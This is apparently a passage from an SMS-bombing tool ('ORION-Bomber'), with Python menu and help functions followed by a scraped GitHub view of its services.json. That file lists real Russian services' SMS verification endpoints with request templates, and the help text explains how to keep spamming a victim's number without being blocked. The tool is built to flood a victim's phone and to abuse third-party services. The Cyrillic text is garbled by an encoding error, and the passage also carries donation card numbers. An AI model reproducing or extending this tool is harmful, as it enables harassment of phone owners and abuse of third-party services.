	print(colored("[2]", "red"), colored("ÐŸÐ¾Ð´Ð´ÐµÑ€Ð¶Ð°Ñ‚ÑŒ Ñ€Ð°Ð·Ñ€Ð°Ð±Ð¾Ñ‚Ñ‡Ð¸ÐºÐ¾Ð²!    <---", "green"))
	print(colored("[3]", "red"), colored("Ð˜Ð½ÑÑ‚Ñ€ÑƒÐºÑ†Ð¸Ñ Ð¿Ð¾ Ð¾Ñ‚Ð¿Ñ€Ð°Ð²ÐºÐµ Ð»Ð¾Ð³Ð¾Ð²", "yellow"))
	print(colored("\n[99]", "red"), colored("Ð˜Ð½Ñ„Ð¾Ñ€Ð¼Ð°Ñ†Ð¸Ñ", "cyan"))
	print(colored("\n[0] Ð’Ñ‹Ñ…Ð¾Ð´", "red"))

def quick_guide():
	print("")
	print(colored("Ð’ Ð½Ð°ÑˆÐµÐ¼ Ð±Ð¾Ð¼Ð±ÐµÑ€Ðµ ÑÐ¿Ð°Ð¼ Ð¼Ð¾Ð¶ÐµÑ‚ Ð¿Ð¾ÑÑ‚ÐµÐ¿ÐµÐ½Ð½Ð¾ ÑƒÑ…ÑƒÐ´ÑˆÐ°Ñ‚ÑŒÑÑ Ð¸Ð·-Ð·Ð° Ñ‚Ð¾Ð³Ð¾ Ñ‡Ñ‚Ð¾ Ð½Ð° Ð¾Ð´Ð¸Ð½ Ð¸ Ñ‚Ð¾Ñ‚ Ð¶Ðµ Ð½Ð¾Ð¼ÐµÑ€ Ð¿Ð¾ÑÑ‚ÑƒÐ¿Ð°ÐµÑ‚ Ð¾Ñ‡ÐµÐ½ÑŒ Ð¼Ð½Ð¾Ð³Ð¾ Ð·Ð°Ð¿Ñ€Ð¾ÑÐ¾Ð² Ð½Ð° Ð¾Ñ‚Ð¿Ñ€Ð°Ð²ÐºÑƒ ÑÐ¼Ñ.", "green"))
	print(colored("ÐÐµ Ð¿Ñ‹Ñ‚Ð°Ð¹Ñ‚ÐµÑÑŒ Ð¾ÑÑ‚Ð°Ð²Ð¸Ñ‚ÑŒ ÑÐ¿Ð°Ð¼ Ð½Ð° Ð²ÑÑŽ Ð½Ð¾Ñ‡ÑŒ Ð½Ð° Ð¾Ð´Ð¸Ð½ Ð¸ Ñ‚Ð¾Ñ‚ Ð¶Ðµ Ð½Ð¾Ð¼ÐµÑ€, Ð²Ñ‹ Ð¿Ñ€Ð¾ÑÑ‚Ð¾ Ð·Ð°ÑÑ‚Ð°Ð²Ð¸Ñ‚Ðµ ÑÐµÑ€Ð²Ð¸ÑÑ‹ Ð·Ð°Ð±Ð»Ð¾ÐºÐ¸Ñ€Ð¾Ð²Ð°Ñ‚ÑŒ Ð´Ð°Ð½Ð½Ñ‹Ð¹ Ð½Ð¾Ð¼ÐµÑ€ Ñƒ ÑÐµÐ±Ñ Ð² Ð±Ð°Ð·Ðµ Ð¸ Ð½Ð¸ÐºÐ°ÐºÐ¸Ðµ Ð¿Ñ€Ð¾ÐºÑÐ¸ Ñ‚ÑƒÑ‚ ÑƒÐ¶Ðµ Ð½Ðµ Ð¿Ð¾Ð¼Ð¾Ð³ÑƒÑ‚.", "green"))
	print(colored("Ð”Ð¾ÑÑ‚Ð°Ñ‚Ð¾Ñ‡Ð½Ð¾ 2-3 ÐºÑ€ÑƒÐ³Ð° Ð½Ð° Ð¾Ð´Ð¸Ð½ Ð½Ð¾Ð¼ÐµÑ€ Ñ€Ð°Ð· Ð² ÑÑƒÑ‚ÐºÐ¸ Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð´Ð¾ÑÑ‚Ð°Ð²Ð¸Ñ‚ÑŒ Ð½Ðµ Ð¼Ð°Ð»Ð¾Ðµ ÐºÐ¾Ð»Ð¸Ñ‡ÐµÑÑ‚Ð²Ð¾ ÑÐ¼Ñ Ð½Ð° Ð¾Ð´Ð¸Ð½ Ð½Ð¾Ð¼ÐµÑ€.", "green"))
	print(colored("ÐÐµ Ð±ÑƒÐ´ÑŒÑ‚Ðµ Ð¶Ð°Ð´Ð½Ñ‹ Ð¸ ÑÐ»Ð¸ÑˆÐºÐ¾Ð¼ Ð¼ÑÑ‚Ð¸Ñ‚ÐµÐ»ÑŒÐ½Ñ‹, Ñ‚Ð¾Ð³Ð´Ð° Ð²Ñ‹ ÑÐ¼Ð¾Ð¶ÐµÑ‚Ðµ Ð¾Ñ‚Ð¿Ñ€Ð°Ð²Ð»ÑÑ‚ÑŒ ÑÐ¼Ñ Ð½Ð° Ð¾Ð´Ð¸Ð½ Ð¸ Ñ‚Ð¾Ñ‚ Ð¶Ðµ Ð½Ð¾Ð¼ÐµÑ€ Ð¿Ð¾ÑÑ‚Ð¾ÑÐ½Ð½Ð¾.", "green"))
	print("\nÐÐ°Ð¶Ð¼Ð¸Ñ‚Ðµ Enter Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð²ÐµÑ€Ð½ÑƒÑ‚ÑŒÑÑ Ð½Ð°Ð·Ð°Ð´")
	input()

def disclaimer():
	print("")
	print(colored("Ð Ð°Ð·Ñ€Ð°Ð±Ð¾Ñ‚Ñ‡Ð¸ÐºÐ¸ ÐºÐ¾Ð¼Ð°Ð½Ð´Ñ‹ ORION Ð½Ðµ Ð½ÐµÑÑƒÑ‚ Ð¾Ñ‚Ð²ÐµÑ‚ÑÑ‚Ð²ÐµÐ½Ð½Ð¾ÑÑ‚ÑŒ Ð·Ð° Ð´Ð¾ÑÑ‚Ð°Ð²Ð»ÐµÐ½Ð½Ñ‹Ð¹ Ð¼Ð¾Ñ€Ð°Ð»ÑŒÐ½Ñ‹Ð¹ Ð¸Ð»Ð¸ Ñ„Ð¸Ð·Ð¸Ñ‡ÐµÑÐºÐ¸Ð¹ ÑƒÑ‰ÐµÑ€Ð± Ð²Ð°ÑˆÐµÐ¹ Ð¶ÐµÑ€Ñ‚Ð²Ðµ.", "green"))
	print(colored("ÐŸÐ¾Ð»ÑŒÐ·ÑƒÑÑÑŒ Ð´Ð°Ð½Ð½Ð¾Ð¹ Ð¿Ñ€Ð¾Ð³Ñ€Ð°Ð¼Ð¼Ð¾Ð¹ Ð²Ñ‹ Ð°Ð²Ñ‚Ð¾Ð¼Ð°Ñ‚Ð¸Ñ‡ÐµÑÐºÐ¸ ÑÐ¾Ð³Ð»Ð°ÑˆÐ°ÐµÑ‚ÐµÑÑŒ Ð½Ð° ÑÑ‚Ð¾ Ð¸ Ð±ÐµÑ€ÐµÑ‚Ðµ Ð²ÑÑŽ Ð¾Ñ‚Ð²ÐµÑ‚ÑÑ‚Ð²ÐµÐ½Ð½Ð¾ÑÑ‚ÑŒ Ð½Ð° ÑÐµÐ±Ñ", "green"))
	print("\nÐÐ°Ð¶Ð¼Ð¸Ñ‚Ðµ Enter Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð²ÐµÑ€Ð½ÑƒÑ‚ÑŒÑÑ Ð½Ð°Ð·Ð°Ð´")
	input()

def donate():
	print("")
	print(colored("Ð’Ð°ÑˆÐ° Ð¿Ð¾Ð´Ð´ÐµÑ€Ð¶Ð° ÐµÑ‰Ðµ Ð±Ð¾Ð»ÑŒÑˆÐµ Ð¼Ð¾Ñ‚Ð¸Ð²Ð¸Ñ€ÑƒÐµÑ‚ Ð½Ð°Ñ Ð²Ñ‹Ð¿ÑƒÑÐºÐ°Ñ‚ÑŒ Ð¾Ð±Ð½Ð¾Ð²Ð»ÐµÐ½Ð¸Ñ!", "green"))
	print("")
	print(colored("QIWI", "yellow"))
	print("â”œ"+colored("https://qiwi.com/n/LUCKY1376", "cyan"), colored("ÐŸÐµÑ€ÐµÐ²Ð¾Ð´ Ð¿Ð¾ Ð½Ð¸ÐºÐ½ÐµÐ¹Ð¼Ñƒ", "green"))
	print("â”œ"+colored("2200 7302 4344 6206", "cyan"), colored("MIR", "green"))
	print("â””"+colored("4890 4947 5754 5546", "cyan"), colored("VISA", "blue"))
	print("")
	print(colored("Ð¡Ð±ÐµÑ€Ð±Ð°Ð½Ðº", "green"))
	print("â”œ"+colored("2202 2024 3331 7181", "cyan"), colored("MIR", "green"))
	print("â””"+colored("5469 4500 1265 2996", "cyan"), colored("MasterCard", "red"))
	print("")
	print(colored("Ð®Ð¼Ð°Ð½Ð¸", "blue"))
	print("â”œ"+colored("4100 1174 8743 5875", "cyan"), "ÐÐ¾Ð¼ÐµÑ€ ÑÑ‡ÐµÑ‚Ð°")
	print("â””"+colored("2202 1201 0852 7850", "cyan"), colored("MIR", "green"))
	print("\nÐÐ°Ð¶Ð¼Ð¸Ñ‚Ðµ Enter Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð²ÐµÑ€Ð½ÑƒÑ‚ÑŒÑÑ Ð½Ð°Ð·Ð°Ð´")
	input()

def faq_proxy():
	print("")
	print(colored("ÐŸÐ¾Ñ‡ÐµÐ¼Ñƒ Ñ Ð¿Ñ€Ð¾ÐºÑÐ¸ Ñ‚Ð°ÐºÐ¾Ð¹ Ð¼ÐµÐ´Ð»ÐµÐ½Ð½Ñ‹Ð¹ ÑÐ¿Ð°Ð¼ Ð¸ Ñ‚Ð°ÐºÐ°Ñ Ñ‡Ð°ÑÑ‚Ð°Ñ Ð¿Ñ€Ð¾Ð²ÐµÑ€ÐºÐ°?", "cyan"))
	print(colored("ÐÐ°Ñˆ Ð¿Ð°Ñ€ÑÐµÑ€ Ð±ÐµÑ€ÐµÑ‚ Ð¿Ñ€Ð¾ÐºÑÐ¸ Ñ Ð¾Ð±Ñ‰ÐµÐ´Ð¾ÑÑ‚ÑƒÐ¿Ð½Ñ‹Ñ… ÑÐµÑ€Ð²Ð¸ÑÐ¾Ð², ÐºÐ¾Ð½ÐµÑ‡Ð½Ð¾ Ð½Ðµ Ñ‚Ð¾Ð»ÑŒÐºÐ¾ Ð¼Ñ‹ Ñ‚Ð°Ðº Ð´ÐµÐ»Ð°ÐµÐ¼ Ð¸ ÑÐ¾Ð¾Ñ‚Ð²ÐµÑÑ‚Ð²ÐµÐ½Ð½Ð¾ Ð½Ðµ Ñ‚Ð¾Ð»ÑŒÐºÐ¾ Ð¼Ñ‹ Ð¿Ð¾Ð»ÑŒÐ·ÑƒÐµÐ¼ÑÑ ÑÑ‚Ð¸Ð¼Ð¸ Ð¿Ñ€Ð¾ÐºÑÐ¸.", "green"))
	print(colored("Ð¢Ð°ÐºÐ¶Ðµ Ð½Ð° Ð´Ð°Ð½Ð½Ñ‹Ñ… ÑÐµÑ€Ð²Ð¸ÑÐ°Ñ… Ð¾Ñ‡ÐµÐ½ÑŒ Ð¼Ð°Ð»Ð¾ Ð´Ð¾Ð²Ð¾Ð»ÑŒÐ½Ð¾ Ð±Ñ‹ÑÑ‚Ñ€Ñ‹Ñ… Ð¸ Ð°Ð½Ð¾Ð½Ð¸Ð¼Ð½Ñ‹Ñ… Ð¿Ñ€Ð¾ÐºÑÐ¸ Ñ‡Ñ‚Ð¾ Ð¿Ð¾Ð·Ð²Ð¾Ð»ÑÐ»Ð¾ Ð±Ñ‹ ÑƒÐ»ÑƒÑ‡ÑˆÐ¸Ñ‚ÑŒ ÑÐ¿Ð°Ð¼ Ñ Ð½Ð¸Ð¼Ð¸.", "green"))
	print(colored("Ð§Ð°ÑÑ‚Ð°Ñ Ð¿Ñ€Ð¾Ð²ÐµÑ€ÐºÐ° Ð²Ð¾Ð·Ð½Ð¸ÐºÐ°ÐµÑ‚ Ð¸Ð·-Ð·Ð° Ð½Ðµ ÑÑ‚Ð°Ð±Ð¸Ð»ÑŒÐ½Ð¾ÑÑ‚Ð¸ ÑÑ‚Ð¸Ñ… Ð¿Ñ€Ð¾ÐºÑÐ¸, Ñ‡Ð°ÑÑ‚Ð¾ Ð¾Ð½Ð¸ Ð¿Ñ€Ð¾ÑÑ‚Ð¾ Ð¿ÐµÑ€ÐµÑÑ‚Ð°ÑŽÑ‚ Ñ€Ð°Ð±Ð¾Ñ‚Ð°Ñ‚ÑŒ Ð¸ Ð¿Ñ€Ð¾Ð³Ñ€Ð°Ð¼Ð¼Ð° Ð±ÐµÑ€ÐµÑ‚ ÑÐ»ÐµÐ´ÑƒÑŽÑ‰Ð¸Ð¹ Ð¸Ð· ÑÐ¿Ð¸ÑÐºÐ°.", "green"))
	print("")
	print(colored("ÐŸÐ¾Ñ‡ÐµÐ¼Ñƒ Ð½ÐµÐ»ÑŒÐ·Ñ Ð¿Ñ€Ð¾ÑÑ‚Ð¾ Ð±Ñ€Ð°Ñ‚ÑŒ Ð¿Ñ€Ð¾ÐºÑÐ¸ Ð»ÑŽÐ±Ð¾Ð¹ ÑÑ‚Ñ€Ð°Ð½Ñ‹ Ð° Ð½Ðµ Ñ‚Ð¾Ð»ÑŒÐºÐ¾ Ð½Ð¾Ð¼ÐµÑ€Ð° ÐºÐ¾Ñ‚Ð¾Ñ€Ð¾Ð³Ð¾ Ð²Ð²ÐµÐ»Ð¸?", "cyan"))
	print(colored("ÐÐµ Ð¿Ð¾Ð»ÑƒÑ‡Ð¸Ñ‚ÑŒÑÑ Ð¸ÑÐ¿Ð¾Ð»ÑŒÐ·Ð¾Ð²Ð°Ñ‚ÑŒ Ð´Ð¾Ð¿ÑƒÑÑ‚Ð¸Ð¼ ÐºÐ°Ð½Ð°Ð´ÑÐºÐ¸Ðµ Ð¿Ñ€Ð¾ÐºÑÐ¸ Ñ Ñ€Ð¾ÑÑÐ¸Ð¹ÑÐºÐ¸Ð¼Ð¸ ÑÐµÑ€Ð²Ð¸ÑÐ°Ð¼Ð¸ Ñ Ð´Ð¾Ð¼ÐµÐ½Ð¾Ð¼ .ru", "green"))
	print(colored("Ð•ÑÐ»Ð¸ Ð½Ð° ÑÐ°Ð¹Ñ‚Ðµ ÑƒÐºÐ°Ð·Ð°Ð½ Ð´Ð¾Ð¼ÐµÐ½ Ð´Ð°Ð½Ð½Ð¾Ð¹ ÑÑ‚Ñ€Ð°Ð½Ñ‹ Ñ‚Ð¾ Ð¸ Ð¿Ñ€Ð¾ÐºÑÐ¸ Ð´Ð¾Ð»Ð¶Ð½Ñ‹ Ð±Ñ‹Ñ‚ÑŒ ÑÑ‚Ð¾Ð¹ Ð¶Ðµ ÑÑ‚Ñ€Ð°Ð½Ñ‹.", "green"))
	print(colored("Ð¡ÐµÑ€Ð²Ð¸ÑÑ‹ Ñ Ð´Ð¾Ð¼ÐµÐ½Ð¾Ð¼ ÑÐ²Ð¾ÐµÐ¹ ÑÑ‚Ñ€Ð°Ð½Ñ‹ Ð¿Ñ€Ð¾ÑÑ‚Ð¾ Ð½Ðµ Ð¿ÑƒÑÑ‚ÑÑ‚ Ð½Ð°Ñˆ Ð·Ð°Ð¿Ñ€Ð¾Ñ Ñ Ð¿Ñ€Ð¾ÐºÑÐ¸ Ð¸Ð½Ð¾Ð¹ ÑÑ‚Ñ€Ð°Ð½Ñ‹.", "green"))
	print("")
	print(colored("ÐŸÐ¾Ñ‡ÐµÐ¼Ñƒ Ð½ÐµÐ»ÑŒÐ·Ñ Ð¿Ñ€Ð¾ÑÑ‚Ð¾ Ð¿Ð¾Ð´ÐºÐ»ÑŽÑ‡Ð¸Ñ‚ÑŒ Ð±Ð¾Ð»ÑŒÑˆÐµ ÑÐµÑ€Ð²Ð¸ÑÐ¾Ð² Ð´Ð»Ñ Ð¿Ñ€Ð¾ÐºÑÐ¸?", "cyan"))
	print(colored("90% Ð¡ÐµÑ€Ð²Ð¸ÑÐ¾Ð² Ñ Ð±ÐµÑÐ¿Ð»Ð°Ñ‚Ð½Ñ‹Ð¼Ð¸ Ð¿Ñ€Ð¾ÐºÑÐ¸ Ð¿Ñ€Ð¾ÑÑ‚Ð¾ Ð²Ð¾Ñ€ÑƒÑŽÑ‚ Ð¸Ñ… Ð´Ñ€ÑƒÐ³ Ñƒ Ð´Ñ€ÑƒÐ³Ð° Ð¸ Ð¸Ð·-Ð·Ð° ÑÑ‚Ð¾Ð³Ð¾ Ð¿Ñ€Ð¾ÑÑ‚Ð¾ Ð½Ðµ Ð¿Ð¾Ð»ÑƒÑ‡Ð¸Ñ‚ÑŒÑÑ Ð¿Ð¾Ð»ÑƒÑ‡Ð¸Ñ‚ÑŒ Ð±Ð¾Ð»ÑŒÑˆÐ¸Ð¹ ÑÐ¿Ð¸ÑÐ¾Ðº.", "green"))
	print(colored("ÐœÑ‹ ÑÑ‚Ð°Ñ€Ð°ÐµÐ¼ÑÑ Ð¸ÑÐºÐ°Ñ‚ÑŒ Ñ…Ð¾Ñ€Ð¾ÑˆÐ¸Ðµ ÑÐµÑ€Ð²Ð¸ÑÑ‹ Ñ Ð±ÐµÑÐ¿Ð»Ð°Ñ‚Ð½Ñ‹Ð¼Ð¸ Ð¿Ñ€Ð¾ÐºÑÐ¸ ÐºÐ¾Ñ‚Ð¾Ñ€Ñ‹Ðµ Ð½Ðµ Ð²Ð¾Ñ€ÑƒÑŽÑ‚ Ð´Ñ€ÑƒÐ³ Ñƒ Ð´Ñ€ÑƒÐ³Ñƒ Ð¸ ÑƒÐ´Ð¾Ð±Ð½Ñ‹ Ð² Ð¿Ð°Ñ€ÑÐ¸Ð½Ð³Ðµ Ð»Ð¸Ð±Ð¾ Ð¸Ð¼ÐµÑŽÑ‚ ÑÐ²Ð¾Ð¹ API.", "green"))
	print("")
	print("")
	print(colored("Ð¡Ð¾Ð²ÐµÑ‚ÑƒÐµÐ¼ Ð²Ð°Ð¼ Ð¸ÑÐ¿Ð¾Ð»ÑŒÐ·Ð¾Ð²Ð°Ñ‚ÑŒ Ð²Ð°ÑˆÐ¸ ÑÐ¾Ð±ÑÑ‚Ð²ÐµÐ½Ð½Ñ‹Ðµ Ð¿Ð¾ÐºÑƒÐ¿Ð½Ñ‹Ðµ Ð¿Ñ€Ð¾ÐºÑÐ¸ ÐµÑÐ»Ð¸ Ñ…Ð¾Ñ‚Ð¸Ñ‚Ðµ ÑÐ¾ÐºÑ€Ð°Ñ‚Ð¸Ñ‚ÑŒ Ð±Ð»Ð¾ÐºÐ¸Ñ€Ð¾Ð²ÐºÑƒ Ð²Ð°ÑˆÐµÐ³Ð¾ IP Ñƒ ÑÐµÑ€Ð²Ð¸ÑÐ¾Ð² Ð¸ Ð¸Ð¼ÐµÑ‚ÑŒ Ñ…Ð¾Ñ€Ð¾ÑˆÑƒÑŽ ÑÐºÐ¾Ñ€Ð¾ÑÑ‚ÑŒ ÑÐ¿Ð°Ð¼Ð°", "green"))
	print("\nÐÐ°Ð¶Ð¼Ð¸Ñ‚Ðµ Enter Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð²ÐµÑ€Ð½ÑƒÑ‚ÑŒÑÑ Ð½Ð°Ð·Ð°Ð´")
	input()

def inst_logs():
	# Checking File System Access
	try:
		if platform == "linux" or platform == "linux2":
			shutil.copyfile('tools/logs.txt', '/storage/emulated/0/Download/logs.txt')
			shutil.copyfile('tools/error_logs.txt', '/storage/emulated/0/Download/error_logs.txt')
			print(colored("Ð¤Ð°Ð¹Ð»Ñ‹", "green"), colored("logs.txt error_logs.txt", "cyan"), colored("Ð±Ñ‹Ð»Ð¸ ÑÐ¾Ñ…Ñ€Ð°Ð½ÐµÐ½Ñ‹ Ð² Ð¿Ð°Ð¿ÐºÑƒ Download Ð½Ð° Ð²Ð°ÑˆÐµÐ¼ ÑƒÑÑ‚Ñ€Ð¾Ð¹ÑÑ‚Ð²Ðµ", "green"))
			print(colored("ÐŸÐ¾Ð¶Ð°Ð»ÑƒÐ¹ÑÑ‚Ð° Ð¾Ñ‚Ð¿Ñ€Ð°Ð²ÑŒÑ‚Ðµ Ð¿Ð¾Ð¾Ñ‡ÐµÑ€ÐµÐ´Ð½Ð¾ ÑÑ‚Ð¸ 2 Ñ„Ð°Ð¹Ð»Ð° Ð½Ð°ÑˆÐµÐ¼Ñƒ Ð±Ð¾Ñ‚Ñƒ Ð² Ñ‚ÐµÐ»ÐµÐ³Ñ€Ð°Ð¼", "green"), colored("https://t.me/orion_feedback_bot", "cyan"))
			print("")
			print("\nÐÐ°Ð¶Ð¼Ð¸Ñ‚Ðµ Enter Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð²ÐµÑ€Ð½ÑƒÑ‚ÑŒÑÑ Ð½Ð°Ð·Ð°Ð´")
			input()
		elif platform == "win32":
			print("")
			print(colored("ÐŸÐ¾Ð¶Ð°Ð»ÑƒÐ¹ÑÑ‚Ð° Ð¾Ñ‚Ð¿Ñ€Ð°Ð²ÑŒÑ‚Ðµ Ð½Ð°ÑˆÐµÐ¼Ñƒ Ð±Ð¾Ñ‚Ñƒ Ð² Ñ‚ÐµÐ»ÐµÐ³Ñ€Ð°Ð¼", "green"), colored("https://t.me/orion_feedback_bot", "cyan"), colored("Ð¿Ð¾Ð¾Ñ‡ÐµÑ€ÐµÐ´Ð½Ð¾ Ñ„Ð°Ð¹Ð»Ñ‹", "green"), colored("logs.txt error_logs.txt", "cyan"), colored("Ð¸Ð· Ð¿Ð°Ð¿ÐºÐ¸", "green"), colored("tools", "cyan"))
			print("")
			print("\nÐÐ°Ð¶Ð¼Ð¸Ñ‚Ðµ Enter Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð²ÐµÑ€Ð½ÑƒÑ‚ÑŒÑÑ Ð½Ð°Ð·Ð°Ð´")
			input()
	except:
		print("")
		print(colored("ÐœÑ‹ Ð½Ðµ ÑÐ¼Ð¾Ð³Ð»Ð¸ Ð¿ÐµÑ€ÐµÐ¼ÐµÑÑ‚Ð¸Ñ‚ÑŒ Ñ„Ð°Ð¹Ð»Ñ‹ Ð² Ð½ÑƒÐ¶Ð½ÑƒÑŽ Ð´Ð¸Ñ€ÐµÐºÑ‚Ð¾Ñ€Ð¸ÑŽ", "yellow"))
		print(colored("Ð’Ð¾Ð·Ð¼Ð¾Ð¶Ð½Ð¾ Ñƒ Ð²Ð°Ñ Ð´Ð»Ñ Ð¢ÐµÑ€Ð¼ÑƒÐºÑÐ° Ð² Ð½Ð°ÑÑ‚Ñ€Ð¾Ð¹ÐºÐ°Ñ… Ñ€Ð°Ð·Ñ€ÐµÑˆÐµÐ½Ð¸Ñ Ð¿Ñ€Ð¸Ð»Ð¾Ð¶ÐµÐ½Ð¸ÑŽ Ð½Ðµ Ð´Ð¾ÑÑ‚ÑƒÐ¿Ð½Ñ‹ Ð¤Ð°Ð¹Ð»Ñ‹ Ð¸ Ð¼ÐµÐ´Ð¸Ð°ÐºÐ¾Ð½Ñ‚ÐµÐ½Ñ‚", "yellow"))
		print(colored("ÐŸÐ¾Ð¶Ð°Ð»ÑƒÐ¹ÑÑ‚Ð° Ñ€Ð°Ð·Ñ€ÐµÑˆÐ¸Ñ‚Ðµ Ð¢ÐµÑ€Ð¼ÑƒÐºÑÑƒ Ð² Ð½Ð°ÑÑ‚Ñ€Ð¾Ð¹ÐºÐ°Ñ… Ð²ÑÐµ Ð½ÑƒÐ¶Ð½Ñ‹Ðµ Ñ€Ð°Ð·Ñ€ÐµÑˆÐµÐ½Ð¸Ñ Ð¸ Ð¿Ð¾Ð²Ñ‚Ð¾Ñ€Ð¸Ñ‚Ðµ Ð¿Ð¾Ð¿Ñ‹Ñ‚ÐºÑƒ"))
		print(colored("Ð—Ð° Ð¿Ð¾Ð¼Ð¾Ñ‰ÑŒÑŽ Ð¿Ð¾ Ð´Ð°Ð½Ð½Ð¾Ð¼Ñƒ Ð²Ð¾Ð¿Ñ€Ð¾ÑÑƒ Ð¿Ð¸ÑˆÐ¸Ñ‚Ðµ Ð² Ð½Ð°ÑˆÐµÐ³Ð¾ Ð±Ð¾Ñ‚Ð° Ð² Ñ‚ÐµÐ»ÐµÐ³Ñ€Ð°Ð¼"), colored("https://t.me/orion_feedback_bot", "cyan"))
		print("")
		print("\nÐÐ°Ð¶Ð¼Ð¸Ñ‚Ðµ Enter Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð²ÐµÑ€Ð½ÑƒÑ‚ÑŒÑÑ Ð½Ð°Ð·Ð°Ð´")
		input()

def clear_logs():
	a = open("tools/logs.txt", "w")
	a.close()
	a = open("tools/error_logs.txt", "w")
	a.close()
	print("")
	print(colored("Ð›Ð¾Ð³Ð¸ ÑƒÑÐ¿ÐµÑˆÐ½Ð¾ Ð±Ñ‹Ð»Ð¸ Ð¾Ñ‡Ð¸Ñ‰ÐµÐ½Ñ‹", "green"))
	print("\nÐÐ°Ð¶Ð¼Ð¸Ñ‚Ðµ Enter Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð²ÐµÑ€Ð½ÑƒÑ‚ÑŒÑÑ Ð½Ð°Ð·Ð°Ð´")
	input()

def banner_info():
	print(colored("\nÐ¢ÐµÐ»ÐµÐ³Ñ€Ð°Ð¼", "cyan"))
	print("â”œ"+colored("Lucky", "green")+":", colored("https://t.me/Lucky1376", "cyan"))
	print("â”œ"+colored("LostIk", "red")+":", colored("https://t.me/LostIk31", "cyan"))
	print("â””"+colored("ÐšÐ°Ð½Ð°Ð»", "cyan")+":", colored("https://t.me/orion_bomber", "cyan"))
	print("\nÐÐ°Ð¶Ð¼Ð¸Ñ‚Ðµ Enter Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð²ÐµÑ€Ð½ÑƒÑ‚ÑŒÑÑ Ð½Ð°Ð·Ð°Ð´")
	input()

def number_ckeck(numb):
	if len(numb) == 9 or len(numb) == 10:
		sp_numb = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
		for i in str(numb):
			try:
				int(i)
			except:
				return False
		return True
	else:
		return False

Sign up
Lucky1376
/
ORION-Bomber
Public
Code
Issues
1
Pull requests
1
Actions
Projects
Security
Insights
ORION-Bomber/tools/services.json
@Lucky1376
Lucky1376 ðŸŽ„Happy New Year! 1.3.0
â€¦
 4 contributors
374 lines (374 sloc)  19.3 KB
{
  "ru":
  [
    {
      "apteka.ru": {
        "url": "https://api.apteka.ru/Auth/Auth_Code?cityUrl=moskva",
        "json": "{'phone': '*phone()*' , 'u': 'U'}",
        "headers": {
          "Accept": "*/*",
          "Accept-Encoding": "gzip, deflate, br",
          "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
          "Access-Control-Request-Headers": "authorization,content-type",
          "Access-Control-Request-Method": "POST",
          "Connection": "keep-alive",
          "Host": "api.apteka.ru",
          "Origin": "https://apteka.ru",
          "Referer": "https://apteka.ru/",
          "Sec-Fetch-Dest": "empty",
          "Sec-Fetch-Mode": "cors",
          "Sec-Fetch-Site": "same-site",
          "User-Agent": ""
        },
        "response": 200,
        "timeout": 120
      },
      "magnit": {
        "url": "https://new.moy.magnit.ru/local/ajax/login/",
        "data": "{'phone': '*+phone*', 'ksid': 'ee191257-a4fe-4e39-9f0f-079c7f721eee_0'}",
        "response": "json",
        "timeout": 120
      },
      "telegram": {
        "url": "https://my.telegram.org/auth/send_password",
        "data": "{'phone': '*+phone*'}",
        "response": 200,
        "timeout": 120
      },
      "citi_link": {
        "url": "https://www.citilink.ru/registration/confirm/phone/*phone*/",
        "data": "{'phone': '*phone*', 'ret': '1', 'smsRepeatDelay': '60', 'smsRepeatsDelay': '60', 'smsRepeatsLimit': '5', 'smsRequestToken': '0220c808-b9fb-408c-a383-897cd658989f'}",
        "response": 200,
        "timeout": 100
      },
      "akbarsa": {
        "url": "https://www.akbars.ru/api/PhoneConfirm/",
        "json": "{'phoneNumber': *phone*}",
        "response": 200,
        "timeout": 300
      },
      "yota": {
        "url": "https://bmp.tv.yota.ru/api/v10/auth/register/msisdn",
        "json": "{'msisdn': '*phone*', 'password': '123456'}",
        "cookies": "https://tv.yota.ru/",
        "response": 201,
        "timeout": 60
      },
      "b_apteka": {
        "url": "https://b-apteka.ru/lk/send_confirm_code",
        "json": "{'phone': '*phone*'}",
        "headers": {
          "X-Requested-With": "XMLHttpRequest",
          "Connection": "keep-alive",
          "Pragma": "no-cache",
          "Cache-Control": "no-cache",
          "Accept-Encoding": "gzip, deflate, br",
          "User-Agent": "",
          "DNT": "1"
        },
        "response": 200,
        "timeout": 60
      },
      "pochtabank": {
        "url": "https://my.pochtabank.ru/dbo/registrationService/ib/phoneNumber",
        "json": "{'confirmation': 'send', 'phone': '*phone()*'}",
        "response": 200,
        "timeout": 120
      },
      "mt_free": {
        "url": "https://cabinet.wi-fi.ru/api/auth/by-sms",
        "data": "{'msisdn': '*mtfree*', 'g-recaptcha-response': ''}",
        "headers": {
          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
          "Accept-Encoding": "gzip, deflate, br",
          "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
          "App-ID": "cabinet",
          "Cache-Control": "no-cache",
          "Connection": "keep-alive",
          "User-Agent": ""
        },
        "response": "json",
        "timeout": 180
      },
      "megafon.tv": {
        "url": "https://bmp.megafon.tv/api/v10/auth/register/msisdn",
        "json": "{'msisdn':'*+phone*', 'password':'123456'}",
        "response": 201,
        "timeout": 600,
        "cookies": "https://megafon.tv/"
      },
      "moezdorovie": {
        "url": "https://moezdorovie.ru/rpc/?method=auth.GetCode",
        "json": "{'jsonrpc':'2.0','id':40,'method':'auth.GetCode','params':{'phone':'*-phone*','mustExist':false, 'sendRealSms':true}}",
        "response": 200,
        "timeout": 300
      },
      "totopizza": {
        "url": "https://api.totopizza.ru/graphql",
        "json": "{\"operationName\":\"requestPhoneCodeAuth\",\"query\":\"\\n  mutation requestPhoneCodeAuth($telephone:String!) {\\n    requestPhoneCodeAuth(telephone:$telephone)\\n  }\\n\",\"variables\":{\"telephone\":\"*phone2*\"}}",
        "response": 200,
        "timeout": 60
      },
      "zdesapteka": {
        "url": "https://zdesapteka.ru/bitrix/services/main/ajax.php?action=zs:main.ajax.AuthActions.sendAuthCode",
